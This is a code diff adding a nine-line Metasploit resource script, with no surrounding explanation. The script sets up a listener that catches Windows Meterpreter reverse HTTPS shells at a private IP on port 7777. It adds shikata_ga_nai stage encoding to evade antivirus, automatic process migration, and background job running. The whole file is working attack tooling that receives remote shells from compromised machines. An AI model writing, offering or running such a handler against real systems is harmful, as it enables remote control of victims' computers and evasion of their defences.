@@ -1,0 +1,9 @@
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_https
+set LHOST 172.16.245.158
+set LPORT 7777
+set EnableStageEncoding true
+set StageEncoder x86/shikata_ga_nai
+set AutoRunScript post/windows/manage/migrate
+set ExitOnSession false
+exploit -j -z
